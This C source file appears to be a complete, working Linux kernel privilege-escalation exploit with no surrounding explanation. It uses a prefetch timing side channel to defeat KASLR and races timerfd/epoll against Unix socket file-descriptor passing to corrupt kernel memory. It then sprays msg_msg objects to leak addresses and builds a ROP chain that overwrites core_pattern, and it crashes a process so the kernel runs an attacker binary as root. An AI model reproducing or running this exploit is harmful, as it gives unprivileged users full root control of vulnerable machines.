#define _GNU_SOURCE
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/timerfd.h>
#include <time.h>
#include <unistd.h>
#include <linux/io_uring.h>
#include <unistd.h>
#include <syscall.h>
#include <sys/mman.h>
#include <err.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/prctl.h>
#include <pthread.h>
#include <poll.h>
#include <sys/epoll.h>
#include <sys/resource.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <string.h>
#include <signal.h>
#include <sys/wait.h>

#define SYSCHK(x) ({              \
	typeof(x) __res = (x);        \
	if (__res == (typeof(x))-1)   \
		err(1, "SYSCHK(" #x ")"); \
	__res;                        \
})
char y[2];
#define PAUSE           \
	{                   \
		printf(":");    \
		read(0, y, 1); \
	}
size_t gettime();
char buf[0x1000];
int timefds[0x1000];
int epfds[0x1000];
struct epoll_event ev[0x1000];
size_t count = 200;
int fds[2];
int A, B, C, D;
char data[0x1000];
int pfd[2];
int ppfd[2][2];
int pppfd[0x1000][2];
int datafd;
int tfd;
char magic[0x1000];
int* msqid;
int* hackq;
struct
{
	long mtype;
	char mtext[0x2000];
} msg;

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull

#define STEP_KERNEL 0x100000ull
#define SCAN_START_KERNEL KERNEL_LOWER_BOUND
#define SCAN_END_KERNEL KERNEL_UPPER_BOUND
#define ARR_SIZE_KERNEL (SCAN_END_KERNEL - SCAN_START_KERNEL) / STEP_KERNEL

#define PHYS_LOWER_BOUND 0xffff888000000000ull
#define PHYS_UPPER_BOUND 0xfffffe0000000000ull

#define STEP_PHYS 0x40000000ull
#define SCAN_START_PHYS PHYS_LOWER_BOUND
#define SCAN_END_PHYS PHYS_UPPER_BOUND
#define ARR_SIZE_PHYS (SCAN_END_PHYS - SCAN_START_PHYS) / STEP_PHYS

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100

uint64_t kaslr;
uint64_t phys;
uint64_t gsbase;

// https://www.willsroot.io/2022/12/entrybleed.html
uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  asm volatile (".intel_syntax noprefix;"
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "xor rax, rax;"
    "lfence;"
    "prefetchnta qword ptr [%4];"
    "prefetcht2 qword ptr [%4];"
    "xor rax, rax;"
    "lfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    ".att_syntax;"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

uint64_t prefetch(int phys)
{
    uint64_t arr_size = ARR_SIZE_KERNEL;
    uint64_t scan_start = SCAN_START_KERNEL;
    uint64_t step_size = STEP_KERNEL;
    if (phys) {
	    arr_size = ARR_SIZE_PHYS;
	    scan_start = SCAN_START_PHYS;
	    step_size = STEP_PHYS;
    }

    uint64_t *data = malloc(arr_size * sizeof(uint64_t));
    memset(data, 0, arr_size * sizeof(uint64_t));

    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++) {
        for (uint64_t idx = 0; idx < arr_size; idx++)
        {
            uint64_t test = scan_start + idx * step_size;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < arr_size; i++) {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = scan_start + i * step_size;
        }
    }

    free(data);

    return addr;
}

size_t KERNEL_BASE = 0xffffffff81000000;
size_t LEAKED_KHEAP = 0xffff888140000000;

size_t mostFrequent(size_t* arr, size_t n)
{
    // code here
    size_t maxcount = 0;
    size_t element_having_max_freq;
    for (int i = 0; i < n; i++) {
        size_t count = 0;
        for (int j = 0; j < n; j++) {
            if (arr[i] == arr[j])
                count++;
        }
  
        if (count > maxcount) {
            maxcount = count;
            element_having_max_freq = arr[i];
        }
    }
  
    return element_having_max_freq;
}

void leak() {
	size_t kbase[0x8] = {0};
	size_t kheap[0x8] = {0};
	for(int i=0;i<0x8;i++){ 
		kbase[i] =  prefetch(0)-0x1600000; 
		kheap[i] =  prefetch(1);
		printf("%p %p\n", kbase[i], kheap[i]);
	}
	KERNEL_BASE = mostFrequent(kbase, 8);
	LEAKED_KHEAP = mostFrequent(kheap, 8);
	//LEAKED_KHEAP = 0xffff8880c0000000;
	printf("choose %p %p\n", KERNEL_BASE, LEAKED_KHEAP);
	//exit(0);
}

#define FIXED_OFFSET 0x140000000
#define PAGE_OFFSET_BASE (LEAKED_KHEAP-FIXED_OFFSET)
#define TARGET_PHYS_ADDR 0x82e2380
#define PHYS_ADDR_MSG (PAGE_OFFSET_BASE+TARGET_PHYS_ADDR)

#define NUM_QUEUE_MAX 32000
#define NUM_QUEUE_RESV 100
#define NUM_QUEUE (NUM_QUEUE_MAX-NUM_QUEUE_RESV)
#define NUM_MSG 204
#define CHUNK_SIZE 0x80
#define MSG_SIZE (CHUNK_SIZE-0x30)

int setup_msg() {
    msqid = malloc(sizeof(*msqid)*40000);
    hackq = malloc(sizeof(*msqid)*NUM_QUEUE_RESV);
    printf("setup msg start..\n");
	memset(&msg.mtext[0], 0, 0x2000);
	msg.mtype = 1;
	system("ipcrm --all=msg");
    for (int i = 0; i < NUM_QUEUE; i++)
    {
        msqid[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
        SYSCHK(msqid[i]);
    }
    for (int i = 0; i < NUM_QUEUE_RESV; i++)
    {
        hackq[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
        SYSCHK(hackq[i]);
    }
	msg.mtext[0x44-0x30] = '\x10'; // nr_frags
	for (int j = 0; j < NUM_MSG; j++) {
	for (int i = 0; i < NUM_QUEUE; i++) {
		*(size_t *)&msg.mtext[0] = i;
		msg.mtype = j+1;
		SYSCHK(msgsnd(msqid[i], &msg, MSG_SIZE, IPC_NOWAIT));

	}
	}
    printf("setup msg done\n");
}

#define START_ROP 0x50
#define STATIC_KBASE 0//0xffffffff81000000

#if 0
#define POP_RDI (KERNEL_BASE + (0xffffffff81129c80 - STATIC_KBASE)) // pop rdi ; ret
#define POP_RDX (KERNEL_BASE + (0xffffffff8128b2b2 - STATIC_KBASE)) // pop rdx ; ret
#define POP_RSI (KERNEL_BASE + (0xffffffff8139025e - STATIC_KBASE)) // pop rsi ; ret
#define POP_RSI2 (KERNEL_BASE + (0xffffffff871ea35e - STATIC_KBASE)) // pop rsi ; mov rax, xxx ; ret
#define POP_RSP (KERNEL_BASE + (0xffffffff81178a50 - STATIC_KBASE)) // pop rsp ; ret
#define PIVOT   (KERNEL_BASE + (0xffffffff8196d827 - STATIC_KBASE)) // push rsi ; jmp qword ptr [rsi + 0x39]
#define PIVOT2  (KERNEL_BASE + (0xffffffff81129c7e - STATIC_KBASE)) // pop rsp ; pop r15 ; ret
#define CORE_PATTERN (KERNEL_BASE + (0xffffffff837ba5e0 - STATIC_KBASE))
#define COPY_FROM_USER (KERNEL_BASE + (0xffffffff81852850 - STATIC_KBASE))
#define MSLEEP (KERNEL_BASE + (0xffffffff81223550 - STATIC_KBASE))
#define ANON_PIPE_BUF_OPS (0xffffffff82a1da40 - STATIC_KBASE)

#else
#define POP_RDI (KERNEL_BASE + (0x012001cc - STATIC_KBASE)) // pop rdi ; ret
#define POP_RSI (KERNEL_BASE + (0x00fd4d75 - STATIC_KBASE)) // pop rsi ; ret
#define POP_RSI2 (KERNEL_BASE + (0x00fd4d75 - STATIC_KBASE)) // pop rsi ; mov eax, xxx ; ret
#define POP_RDX (KERNEL_BASE + (0x00fc7352 - STATIC_KBASE)) // pop rdx ; ret
#define POP_RSP (KERNEL_BASE + (0x00fd3ea6 - STATIC_KBASE)) // pop rsp ; ret
#define PIVOT   (KERNEL_BASE + (0x008a9428 - STATIC_KBASE)) // push rsi ; jmp qword ptr [rsi + 0x39]
#define PIVOT2  (KERNEL_BASE + (0x0008160e - STATIC_KBASE)) // pop rsp ; pop r15 ; ret
#define PIVOT3   (KERNEL_BASE + (0 - STATIC_KBASE)) // push rsi ; jmp qword ptr [rsi + 0x2e]
#define CORE_PATTERN (KERNEL_BASE + (0x239e4a0 - STATIC_KBASE))
#define COPY_FROM_USER (KERNEL_BASE + (0x7855f0 - STATIC_KBASE))
#define MSLEEP (KERNEL_BASE + (0x16c1c0 - STATIC_KBASE))
#define ANON_PIPE_BUF_OPS_OFF (0x17cae40 - STATIC_KBASE)
#endif

char user_buf[] = "|/proc/%P/fd/666";
#define ROP(idx) ((size_t*)rop)[(idx)+(START_ROP/8)]
int build_rop(size_t rop_addr, char* rop) {
	*(size_t*)&rop[0x8] = POP_RDI;
	*(size_t*)&rop[0x18] = POP_RSP;
	*(size_t*)&rop[0x20] = rop_addr+START_ROP;

	//*(size_t*)&rop[0x10] = 0x41414141414;
	*(size_t*)&rop[0x10] = rop_addr+0x20;
	//*(size_t*)&rop[0x10] = rop_addr+0x30;

	*(size_t*)&rop[0x28] = PIVOT;
	//*(size_t*)&rop[0x38] = PIVOT3;

	*(size_t*)&rop[0x39] = PIVOT2;
	//*(size_t*)&rop[0x2e] = PIVOT2;

	int i = 0;
	ROP(i++) = POP_RDI;
	ROP(i++) = CORE_PATTERN;
	ROP(i++) = POP_RSI2;
	ROP(i++) = (size_t)&user_buf;
	ROP(i++) = POP_RDX;
	ROP(i++) = sizeof(user_buf);
	ROP(i++) = COPY_FROM_USER;
	ROP(i++) = POP_RDI;
	ROP(i++) = 0x10000;
	ROP(i++) = MSLEEP;
}

int corrupted_msg() {
	int corrupted_q = 0;
	int corrupted_type = 0;
	int victim_q, victim_type = 0;
	for(int i = 0; i < NUM_QUEUE; i++) {
		int tmp_mtype = 0;
		for(int j = 0; j < NUM_MSG; j++) {
			if(msgrcv(msqid[i], &msg, MSG_SIZE, j, MSG_COPY|IPC_NOWAIT) < 0) {
				break;
			//	corrupted_q = i;
			//	corrupted_type = j+1;
			//	printf("Found %d %d\n", corrupted_q, corrupted_type);
			}
			if(msg.mtype - 1 != tmp_mtype || *(size_t*)&msg.mtext[0] != i) {
				corrupted_q = i;
				corrupted_type = tmp_mtype;
				victim_q = *(size_t*)&msg.mtext[0];
				victim_type = msg.mtype;
				goto done;
			}
			tmp_mtype = msg.mtype;
		}
	}
done:
	if(corrupted_type) {
		printf("corrupted_q: %d\n", corrupted_q);
		printf("corrupted_type: %d\n", corrupted_type);
		printf("victim_q: %d\n", victim_q);
		printf("victim_type: %d\n", victim_type);
		msgrcv(msqid[victim_q], &msg, MSG_SIZE, victim_type, IPC_NOWAIT);
		((size_t *)&msg.mtext[0x1000-0x30])[0] = 0xdead000000000122;
		((size_t *)&msg.mtext[0x1000-0x30])[1] = 0x1337;
		((size_t *)&msg.mtext[0x1000-0x30])[2] = 0x200;
		((size_t *)&msg.mtext[0x1000-0x30])[3] = NULL;
		((size_t *)&msg.mtext[0x1000-0x30])[4] = NULL;

		for(int j = 0; j < NUM_QUEUE_RESV; j++) {
			((size_t *)&msg.mtext[0x1000-0x30])[5] = j;
			msg.mtype = 1;
			SYSCHK(msgsnd(hackq[j], &msg, 0x1000-0x30+0x80-8, 0));
			msg.mtype = 2;
			SYSCHK(msgsnd(hackq[j], &msg, 0x200, 0)); // send rop here later
		}
		SYSCHK(msgrcv(msqid[corrupted_q], &msg, 0x200, corrupted_type, MSG_COPY|IPC_NOWAIT));
		int victim2_q = *(size_t*)&msg.mtext[0x80];
		int victim2_type = *(size_t*)&msg.mtext[0x60];
		printf("victim2_q: %d\n", victim2_q);
		printf("victim2_type: %d\n", victim2_type);
		msgrcv(msqid[victim2_q], &msg, MSG_SIZE, victim2_type, IPC_NOWAIT);

		for(int j = 0; j < NUM_QUEUE_RESV; j++) {
			msg.mtype = 3;
			*(size_t *)&msg.mtext[0] = j;
			SYSCHK(msgsnd(hackq[j], &msg, MSG_SIZE, 0));
			msg.mtype = 4;
			SYSCHK(msgsnd(hackq[j], &msg, 0x400-0x30, 0));
		}
		SYSCHK(msgrcv(msqid[corrupted_q], &msg, 0x200, corrupted_type, MSG_COPY|IPC_NOWAIT));
		size_t known_addr_pipe = *(size_t*)&msg.mtext[0x50];
		size_t known_addr_rop = *(size_t*)&msg.mtext[0x58];
		int victim3_q = *(size_t*)&msg.mtext[0x80];
		int victim4_q = *(size_t*)&msg.mtext[0x0];
		printf("known_addr_rop %p\n", known_addr_rop);
		printf("known_addr_pipe %p\n", known_addr_pipe);
		printf("victim3_q: %d\n", victim3_q);
		printf("victim4_q: %d\n", victim4_q);
		SYSCHK(msgrcv(hackq[victim3_q], &msg, 0x400-0x30, 4, IPC_NOWAIT));
		for(int i=0;i<0x400;i++) {
			SYSCHK(pipe(pppfd[i]));
			SYSCHK(write(pppfd[i][1], "pwn", 3));
		}

		SYSCHK(msgrcv(hackq[victim4_q], &msg, 0x1000-0x30+0x80-8, 1, IPC_NOWAIT));

		((size_t *)&msg.mtext[0x1000-0x30])[0] = 0xdead000000000122;
		((size_t *)&msg.mtext[0x1000-0x30])[1] = 0x1337;
		((size_t *)&msg.mtext[0x1000-0x30])[2] = 0x1000-0x30+0x400-0x8;
		((size_t *)&msg.mtext[0x1000-0x30])[3] = known_addr_pipe-0x10;

		for(int j = 0; j < NUM_QUEUE_RESV; j++) {
			((size_t *)&msg.mtext[0x1000-0x30])[5] = j;
			msg.mtype = 5;
			SYSCHK(msgsnd(hackq[j], &msg, 0x1000-0x30+0x80-8, 0));
		}

		SYSCHK(msgrcv(msqid[corrupted_q], &msg, 0x1000-0x30+0x400-0x8, corrupted_type, MSG_COPY|IPC_NOWAIT));
		int victim5_q = *(size_t*)&msg.mtext[0x0];
		printf("victim5_q: %d\n", victim5_q);
		size_t anon_pipe_buf = *(size_t*)&msg.mtext[0x1000-0x30+0x20-8];
        printf("anon_pipe_buf %p\n", anon_pipe_buf);
        KERNEL_BASE = anon_pipe_buf - ANON_PIPE_BUF_OPS_OFF;
        printf("fixing kernel base to %p\n", KERNEL_BASE);

		SYSCHK(msgrcv(hackq[victim5_q], &msg, 0x1000-0x30+0x80-8, 5, IPC_NOWAIT));

		((size_t *)&msg.mtext[0x1000-0x30])[0] = 0xdead000000000122;
		((size_t *)&msg.mtext[0x1000-0x30])[1] = 0x1337;
		((size_t *)&msg.mtext[0x1000-0x30])[2] = MSG_SIZE;
		((size_t *)&msg.mtext[0x1000-0x30])[3] = 0;
		((size_t *)&msg.mtext[0x1000-0x30])[4] = known_addr_pipe;

		for(int j = 0; j < NUM_QUEUE_RESV; j++) {
			((size_t *)&msg.mtext[0x1000-0x30])[5] = j;
			msg.mtype = 1;
			SYSCHK(msgsnd(hackq[j], &msg, 0x1000-0x30+0x80-8, 0));
		}

        for(int j = 0; j < NUM_QUEUE_RESV; j++) {
            if(j != victim5_q)
                SYSCHK(msgrcv(hackq[j], &msg, 0x1000-0x30+0x80-8, 5, IPC_NOWAIT));
        }

		SYSCHK(msgrcv(msqid[corrupted_q], &msg, MSG_SIZE, 0x1337, IPC_NOWAIT));

		msg.mtype = 6;
		build_rop(known_addr_pipe, &msg.mtext[0x1000-0x30-8]);
		for(int j = 0; j < NUM_QUEUE_RESV; j++) {
			SYSCHK(msgsnd(hackq[j], &msg, 0x1000-0x30+0x400-8, IPC_NOWAIT));
		}

		for(int i=0;i<0x400;i++) {
			close(pppfd[i][0]);
			close(pppfd[i][1]);
		}

		return 1;
	}
	return 0;
}

void set_cpu(int i);

int setup_datafd()
{

	int tmpfd[2];
	pipe(tmpfd);
	write(tmpfd[1], data, 0x1000);
	close(tmpfd[1]);
	return tmpfd[0];
}

void *job00(void *x)
{
	set_cpu(0);
	struct itimerspec new = {.it_value.tv_nsec = count};
	write(pfd[1], "H", 1);
	SYSCHK(timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new, NULL));
	splice(datafd, 0, A, 0, 0x1000, 0);
	close(datafd);
	return NULL;
}

void *job01(void *x)
{
	set_cpu(1);
	int s = socket(AF_UNIX, SOCK_STREAM, 0);
	read(pfd[0], &x, 1);
	close(s);
	return NULL;
}

void *job02(void *x)
{
	set_cpu(1);
	read(ppfd[0][0], buf, 1);
	for (int i = 0; i < 0x100; i++)
		for (int j = 0; j < 0x10; j++)
			write(pppfd[i][1], magic, 0x1000);

	return NULL;
}

static void epoll_ctl_add(int epfd, int fd, uint32_t events)
{
	struct epoll_event ev;
	ev.events = events;
	ev.data.fd = fd;
	SYSCHK(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev));
}

void set_cpu(int i)
{
	long number_of_processors = sysconf(_SC_NPROCESSORS_ONLN);
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i + number_of_processors - 2, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

void do_epoll_enqueue(int fd)
{
	int cfd[2];
	socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
	for (int k = 0; k < 0x4; k++)
	{
		if (fork() == 0)
		{
			for (int i = 0; i < 0x100; i++)
			{
				timefds[i] = SYSCHK(dup(fd));
			}
			for (int i = 0; i < 0xc0; i++)
			{
				epfds[i] = SYSCHK(epoll_create(0x1));
			}
			for (int i = 0; i < 0xc0; i++)
			{
				for (int j = 0; j < 0x100; j++)
				{
					// printf("%p %p %p\n",k,i,j);
					epoll_ctl_add(epfds[i], timefds[j], 0);
				}
			}
			write(cfd[1], buf, 1);
			raise(SIGSTOP);
			printf("OK");
		}
		read(cfd[0], buf, 1);
	}
}

int check_core()
{
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}

void crash(char *cmd)
{
    int memfd = memfd_create("", 0);
    SYSCHK(sendfile(memfd, open("root", 0), 0, 0xffffffff));
    dup2(memfd, 666);
    close(memfd);
    while (check_core() == 0)
        sleep(1);
    *(size_t *)0 = 0;
}

int main(int argc, char** argv)
{
	setvbuf(stdout, 0, 2, 0);
	leak();
	printf("POP_RDI @ %p\n", POP_RDI);
	printf("POP_RDX @ %p\n", POP_RDX);
	printf("POP_RSI @ %p\n", POP_RSI);
	printf("POP_RSP @ %p\n", POP_RSP);
	printf("POP_RSI2 @ %p\n", POP_RSI2);
	printf("PIVOT @ %p\n", PIVOT);
	printf("PIVOT2 @ %p\n", PIVOT2);
	printf("PIVOT3 @ %p\n", PIVOT3);
	signal(SIGPIPE, SIG_IGN);
    if (fork() == 0)
    {
        set_cpu(1);
        strcpy(argv[0], "billy");
        while (1)
            sleep(1);
    }
    if (fork() == 0)
    {
        set_cpu(1);
        setsid();
        crash("");
    }

	struct rlimit rlim = {
		.rlim_cur = 0xf000,
		.rlim_max = 0xf000};
	setrlimit(RLIMIT_NOFILE, &rlim);
	tfd = timerfd_create(CLOCK_MONOTONIC, 0);
	do_epoll_enqueue(tfd);
	pipe(pfd);
	setup_msg();
	printf("setup head to %p\n", PHYS_ADDR_MSG);
	for (int i = 0; i < 0x10; i++)
	{
		*(size_t *)&magic[i * 0x100 + 0xc0] = PHYS_ADDR_MSG;
		*(int *)&magic[i * 0x100 + 0xbc] = 0x42;
	}

	for (int i = 0; i < 0x100; i++)
		SYSCHK(pipe(pppfd[i]));

	struct msghdr msg = {};
	struct iovec iov[] = {{.iov_base = data, .iov_len = 5}};
	msg.msg_iov = iov;
	msg.msg_iovlen = 1;
	struct cmsghdr *cmsg;
	int len = CMSG_LEN(sizeof(int));
	cmsg = (struct cmsghdr *)calloc(0x10, len);
	cmsg->cmsg_len = len;
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	msg.msg_control = cmsg;
	msg.msg_controllen = len;
	set_cpu(1);
	while(1){

	if(fork()==0){
		while (1)
		{

			if ((count & 0xff) == 0) {
				printf("%p\n", (void *)count);
				if(corrupted_msg())
					break;
			}
			if ((count & 0xfff) == 0)
			{
				count = 200;
			}

			count++;
			pipe(ppfd[0]);
			pipe(ppfd[1]);
			pthread_t sp;
			pthread_create(&sp, 0, job02, 0);
			write(ppfd[1][1], data, 0x1000);
			datafd = ppfd[1][0];

			SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, fds));
			A = fds[0];
			B = fds[1];
			SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, fds));
			C = fds[0];
			D = fds[1];

			size_t val = 0x400000;
			SYSCHK(SYSCHK(setsockopt(D, SOL_SOCKET, SO_SNDBUF, &val, 4)));
			SYSCHK(SYSCHK(setsockopt(A, SOL_SOCKET, SO_SNDBUF, &val, 4)));
			SYSCHK(SYSCHK(setsockopt(B, SOL_SOCKET, SO_RCVBUF, &val, 4)));
			SYSCHK(SYSCHK(setsockopt(C, SOL_SOCKET, SO_RCVBUF, &val, 4)));

			*(int *)CMSG_DATA(cmsg) = C;
			sendmsg(D, &msg, 0);
			for (int i = 0; i < 0x100; i++)
				SYSCHK(sendmsg(D, &msg, 0));

			cmsg->cmsg_len = CMSG_LEN(sizeof(int) * 3);
			msg.msg_controllen = cmsg->cmsg_len;
			((int *)CMSG_DATA(cmsg))[0] = ppfd[0][1];
			((int *)CMSG_DATA(cmsg))[1] = ppfd[1][1];
			((int *)CMSG_DATA(cmsg))[2] = C;

			SYSCHK(sendmsg(A, &msg, 0));
			close(ppfd[0][1]);
			close(ppfd[1][1]);

			cmsg->cmsg_len = CMSG_LEN(sizeof(int));
			msg.msg_controllen = cmsg->cmsg_len;
			*(int *)CMSG_DATA(cmsg) = B;
			SYSCHK(sendmsg(D, &msg, 0));

			*(int *)CMSG_DATA(cmsg) = C;
			for (int i = 0; i < 0x100; i++)
				SYSCHK(sendmsg(D, &msg, 0));

			close(B);
			close(C);

			pthread_t tid[2];
			pthread_create(&tid[1], NULL, job01, NULL);
			pthread_create(&tid[0], NULL, job00, NULL);
			pthread_join(tid[1], NULL);
			pthread_join(tid[0], NULL);
			pthread_join(sp, NULL);
			for (int i = 0; i < 0x100; i++)
				for (int j = 0; j < 0x10; j++)
					read(pppfd[i][0], buf, 0x1000);

			close(A);
			close(D);
			close(ppfd[0][0]);
			close(ppfd[1][0]);
		}
		exit(0);
	}
	wait(0);
	}
}	
